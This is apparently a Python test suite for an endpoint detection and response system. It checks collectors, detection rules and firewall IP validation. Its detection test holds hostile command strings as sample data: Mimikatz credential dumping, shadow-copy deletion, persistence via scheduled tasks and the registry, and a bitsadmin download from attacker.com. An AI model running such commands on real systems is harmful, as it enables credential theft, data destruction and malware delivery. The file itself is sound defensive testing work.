#!/usr/bin/env python
"""
Test Suite for CMD Detection & IP Blocking
Verify that commands are detected and IPs are blocked with real data
"""

import json
import subprocess
import time
from pathlib import Path
import sys

# Add backend to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from backend.edr.agent.collectors import CommandActivityCollector, ProcessCollector, NetworkCollector
from backend.edr.detection.engine import DetectionEngine
from backend.edr.models import Event, EventType
from backend.edr.pipeline.normalizer import EventNormalizer
from backend.edr.response.firewall import WindowsFirewallController


def print_section(title: str) -> None:
    """Print formatted section header"""
    print(f"\n{'='*80}")
    print(f"  {title}")
    print(f"{'='*80}\n")


def test_command_collection() -> None:
    """Test 1: Verify command collection works with real processes"""
    print_section("TEST 1: COMMAND COLLECTION - Real Data Sources")
    
    print("📊 Collecting active commands on system...\n")
    
    collector = CommandActivityCollector()
    events = collector.collect()
    
    print(f"✓ Collected {len(events)} command events\n")
    
    if events:
        print("Sample commands collected:")
        for i, event in enumerate(events[:5], 1):
            payload = event["payload"]
            print(f"\n  {i}. Process: {payload.get('process_name', 'N/A')}")
            print(f"     Command: {payload.get('command_line', 'N/A')[:100]}...")
            print(f"     User: {payload.get('username', 'N/A')}")
            print(f"     PID: {payload.get('pid', 'N/A')}")
    else:
        print("⚠ No command events collected - check if cmd.exe/powershell are running")
    
    return len(events) > 0


def test_process_collection() -> None:
    """Test 2: Verify process collection captures full command lines"""
    print_section("TEST 2: PROCESS COLLECTION - Real Running Processes")
    
    print("📊 Collecting all running processes...\n")
    
    collector = ProcessCollector()
    events = collector.collect()
    
    print(f"✓ Collected {len(events)} process events\n")
    
    # Filter for cmd/powershell processes
    shell_processes = [
        e for e in events 
        if e["payload"].get("process_name", "").lower() in ["cmd.exe", "powershell.exe", "pwsh.exe"]
    ]
    
    print(f"📌 Shell processes: {len(shell_processes)}")
    
    if shell_processes:
        print("\nShell processes found:")
        for event in shell_processes[:3]:
            payload = event["payload"]
            print(f"  • {payload.get('process_name')}")
            print(f"    Command: {payload.get('cmdline', 'N/A')[:80]}...")
    
    return len(events) > 0


def test_network_collection() -> None:
    """Test 3: Verify network connection collection"""
    print_section("TEST 3: NETWORK COLLECTION - Real Connections")
    
    print("📊 Collecting active network connections...\n")
    
    collector = NetworkCollector()
    events = collector.collect()
    
    print(f"✓ Collected {len(events)} network events\n")
    
    # Show unique remote IPs
    remote_ips = set()
    for event in events:
        remote_ip = event["payload"].get("remote_ip")
        if remote_ip and not remote_ip.startswith("127."):
            remote_ips.add(remote_ip)
    
    print(f"📌 Unique remote IPs: {len(remote_ips)}")
    
    if remote_ips:
        print("\nSample connections:")
        for ip in list(remote_ips)[:5]:
            matching = [e for e in events if e["payload"].get("remote_ip") == ip]
            if matching:
                event = matching[0]
                print(f"  • {ip}:{event['payload'].get('remote_port', 'N/A')}")
                print(f"    Status: {event['payload'].get('status', 'N/A')}")
                print(f"    PID: {event['payload'].get('pid', 'N/A')}")
    
    return len(events) > 0


def test_suspicious_command_detection() -> None:
    """Test 4: Verify detection engine identifies suspicious commands"""
    print_section("TEST 4: DETECTION ENGINE - Suspicious Command Patterns")
    
    engine = DetectionEngine()
    print(f"✓ Loaded {len(engine.rules)} detection rules\n")
    
    # Test cases with suspicious patterns
    test_commands = [
        {
            "name": "Encoded PowerShell",
            "command": "powershell.exe -enc JABzAD0AKABOAGUAdwAtAE8AYgBq",
            "expected": True
        },
        {
            "name": "Mimikatz Execution",
            "command": "mimikatz.exe lsadump::sam",
            "expected": True
        },
        {
            "name": "Ransomware Anti-Recovery",
            "command": "vssadmin delete shadows /all /quiet",
            "expected": True
        },
        {
            "name": "Scheduled Task Creation",
            "command": "schtasks /create /tn evil /tr malware.exe",
            "expected": True
        },
        {
            "name": "Registry Persistence",
            "command": "reg add HKLM\\Run /v malware",
            "expected": True
        },
        {
            "name": "BITS Download",
            "command": "bitsadmin /transfer /download http://attacker.com/malware",
            "expected": True
        },
        {
            "name": "Normal IPConfig",
            "command": "ipconfig /all",
            "expected": False
        },
        {
            "name": "Normal Whoami",
            "command": "whoami",
            "expected": False
        },
    ]
    
    print("Testing command detection:\n")
    
    passed = 0
    failed = 0
    
    for test_case in test_commands:
        # Create mock event
        event = Event(
            source="command_collector",
            event_type=EventType.COMMAND,
            title="command_observed",
            payload={
                "pid": 1234,
                "process_name": "cmd.exe",
                "command_line": test_case["command"],
                "username": "admin"
            }
        )
        
        # Run detection
        detections = engine.evaluate(event)
        detected = len(detections) > 0
        
        expected = test_case["expected"]
        status = "✓" if detected == expected else "✗"
        result = "PASS" if detected == expected else "FAIL"
        
        print(f"{status} {test_case['name']}: {result}")
        print(f"   Command: {test_case['command'][:70]}...")
        print(f"   Detected: {detected} (Expected: {expected})")
        
        if detections:
            for detection in detections:
                print(f"   → Rule: {detection.rule_id} ({detection.rule_name})")
        print()
        
        if detected == expected:
            passed += 1
        else:
            failed += 1
    
    print(f"\nResults: {passed} passed, {failed} failed")
    return failed == 0


def test_unauthorized_outbound_detection() -> None:
    """Test 5: Verify network detection for unauthorized IPs"""
    print_section("TEST 5: NETWORK DETECTION - Unauthorized Outbound")
    
    engine = DetectionEngine()
    
    test_cases = [
        {
            "name": "Localhost (Allowed)",
            "ip": "127.0.0.1",
            "expected": False
        },
        {
            "name": "Private Network (Should Alert)",
            "ip": "192.168.1.100",
            "expected": True
        },
        {
            "name": "Public Internet (Should Alert)",
            "ip": "8.8.8.8",
            "expected": True
        },
        {
            "name": "C2 Server IP (Should Alert)",
            "ip": "203.0.113.44",
            "expected": True
        },
    ]
    
    print("Testing network detection:\n")
    
    passed = 0
    failed = 0
    
    for test_case in test_cases:
        event = Event(
            source="network_collector",
            event_type=EventType.NETWORK,
            title="network_connection_observed",
            payload={
                "remote_ip": test_case["ip"],
                "remote_port": 443,
                "local_address": "192.168.1.10:51234",
                "status": "ESTABLISHED",
                "pid": 1234
            }
        )
        
        detections = engine.evaluate(event)
        detected = len(detections) > 0
        
        expected = test_case["expected"]
        status = "✓" if detected == expected else "✗"
        result = "PASS" if detected == expected else "FAIL"
        
        print(f"{status} {test_case['name']}: {result}")
        print(f"   IP: {test_case['ip']}")
        print(f"   Detected: {detected} (Expected: {expected})")
        
        if detections:
            for detection in detections:
                print(f"   → Rule: {detection.rule_id} ({detection.rule_name})")
        print()
        
        if detected == expected:
            passed += 1
        else:
            failed += 1
    
    print(f"\nResults: {passed} passed, {failed} failed")
    return failed == 0


def test_firewall_rules() -> None:
    """Test 6: Verify IP blocking through Windows Firewall"""
    print_section("TEST 6: FIREWALL RULES - IP Blocking")
    
    print("Testing Windows Firewall IP blocking...\n")
    
    # Check if Windows
    if sys.platform != "win32":
        print("⚠ This test requires Windows. Skipping.")
        return False
    
    try:
        controller = WindowsFirewallController()
        
        # Test IP validation
        test_ips = [
            ("203.0.113.44", True, "Valid Public IP"),
            ("192.168.1.1", True, "Valid Private IP"),
            ("invalid_ip", False, "Invalid IP Format"),
            ("256.256.256.256", False, "Out of Range"),
        ]
        
        print("IP Validation Tests:\n")
        
        for ip, should_pass, description in test_ips:
            try:
                validated = controller._validate_ip(ip)
                status = "✓" if should_pass else "✗"
                result = "PASS" if should_pass else "FAIL"
                print(f"{status} {description} ({ip}): {result}")
                if should_pass:
                    print(f"   Validated as: {validated}")
            except ValueError as e:
                status = "✓" if not should_pass else "✗"
                result = "PASS" if not should_pass else "FAIL"
                print(f"{status} {description} ({ip}): {result}")
                print(f"   Error (expected): {str(e)[:50]}")
            print()
        
        return True
    
    except Exception as e:
        print(f"⚠ Error testing firewall: {e}")
        return False


def test_end_to_end_suspicious_command() -> None:
    """Test 7: End-to-end test - Simulate malicious command"""
    print_section("TEST 7: END-TO-END - Complete Attack Simulation")
    
    print("Simulating suspicious command execution...\n")
    
    # Step 1: Create a test command event
    print("1️⃣  Creating command event for: powershell.exe -enc JABzAD0A...\n")
    
    event = Event(
        source="command_collector",
        event_type=EventType.COMMAND,
        title="command_observed",
        payload={
            "pid": 9999,
            "ppid": 512,
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -enc JABzAD0AKABOAGUAdwAtAE8AYgBqAGUA",
            "username": "admin",
            "capture_method": "live_process"
        }
    )
    
    print(f"   Event ID: {event.event_id}")
    print(f"   Timestamp: {event.timestamp}")
    print(f"   Source: {event.source}")
    
    # Step 2: Normalize the event
    print("\n2️⃣  Normalizing event...\n")
    
    normalizer = EventNormalizer()
    normalized_event = normalizer.normalize(event.to_dict())
    
    print(f"   ✓ Normalized to standard schema")
    print(f"   Event Type: {normalized_event.event_type}")
    print(f"   Title: {normalized_event.title}")
    
    # Step 3: Run detection
    print("\n3️⃣  Running detection engine...\n")
    
    engine = DetectionEngine()
    detections = engine.evaluate(normalized_event)
    
    print(f"   ✓ Evaluated against {len(engine.rules)} rules")
    print(f"   Detections found: {len(detections)}")
    
    if detections:
        detection = detections[0]
        print(f"\n   📌 Detection Details:")
        print(f"      Rule ID: {detection.rule_id}")
        print(f"      Rule Name: {detection.rule_name}")
        print(f"      Severity: {detection.severity}")
        print(f"      Confidence: {detection.confidence}%")
        print(f"      Tactics: {', '.join(detection.tactics)}")
        print(f"      Techniques: {', '.join(detection.techniques)}")
    
    # Step 4: Show what would happen next
    print("\n4️⃣  Response Actions...\n")
    
    if detections:
        print("   The system would:")
        print("   ✓ Generate alert in dashboard")
        print("   ✓ Store detection in database")
        print("   ✓ Notify SOC analyst")
        print("   ✓ Log to detections.jsonl")
    
    return len(detections) > 0


def test_real_system_audit() -> None:
    """Test 8: Audit real system for current threats"""
    print_section("TEST 8: REAL SYSTEM AUDIT - Current Status")
    
    print("Scanning current system for suspicious activity...\n")
    
    engine = DetectionEngine()
    suspicious_found = 0
    
    # Collect all command events
    command_collector = CommandActivityCollector()
    command_events = command_collector.collect()
    
    print(f"📊 Analyzing {len(command_events)} command events...\n")
    
    for event in command_events:
        # Create Event object
        cmd_event = Event(
            source=event["source"],
            event_type=EventType.COMMAND,
            title=event["title"],
            payload=event["payload"]
        )
        
        # Run detection
        detections = engine.evaluate(cmd_event)
        
        if detections:
            suspicious_found += 1
            print(f"🚨 SUSPICIOUS COMMAND DETECTED")
            print(f"   Process: {event['payload'].get('process_name')}")
            print(f"   Command: {event['payload'].get('command_line', 'N/A')[:80]}...")
            print(f"   Rules Matched: {[d.rule_id for d in detections]}")
            print()
    
    # Collect network events
    network_collector = NetworkCollector()
    network_events = network_collector.collect()
    
    print(f"\n📊 Analyzing {len(network_events)} network events...\n")
    
    for event in network_events:
        net_event = Event(
            source=event["source"],
            event_type=EventType.NETWORK,
            title=event["title"],
            payload=event["payload"]
        )
        
        detections = engine.evaluate(net_event)
        
        if detections:
            suspicious_found += 1
            print(f"🚨 SUSPICIOUS NETWORK DETECTED")
            print(f"   Remote IP: {event['payload'].get('remote_ip')}")
            print(f"   Port: {event['payload'].get('remote_port')}")
            print(f"   Rules Matched: {[d.rule_id for d in detections]}")
            print()
    
    print(f"\n📋 Summary: {suspicious_found} suspicious activities found")
    return True


def main() -> None:
    """Run all tests"""
    print("\n" + "="*80)
    print("  EDR SYSTEM - COMPREHENSIVE TEST SUITE")
    print("  Testing CMD Detection & IP Blocking with Real Data Sources")
    print("="*80)
    
    results = {
        "Command Collection": test_command_collection(),
        "Process Collection": test_process_collection(),
        "Network Collection": test_network_collection(),
        "Detection Engine - Commands": test_suspicious_command_detection(),
        "Detection Engine - Network": test_unauthorized_outbound_detection(),
        "Firewall Rules": test_firewall_rules(),
        "End-to-End Simulation": test_end_to_end_suspicious_command(),
        "Real System Audit": test_real_system_audit(),
    }
    
    print_section("TEST RESULTS SUMMARY")
    
    print("Test Results:\n")
    passed = 0
    failed = 0
    
    for test_name, result in results.items():
        status = "✓ PASS" if result else "✗ FAIL"
        print(f"  {status}: {test_name}")
        if result:
            passed += 1
        else:
            failed += 1
    
    print(f"\n📊 Total: {passed} passed, {failed} failed")
    
    if failed == 0:
        print("\n✅ All tests passed! System is working correctly.")
    else:
        print(f"\n⚠ {failed} test(s) failed. Please review above.")
    
    print("\n" + "="*80)


if __name__ == "__main__":
    main()
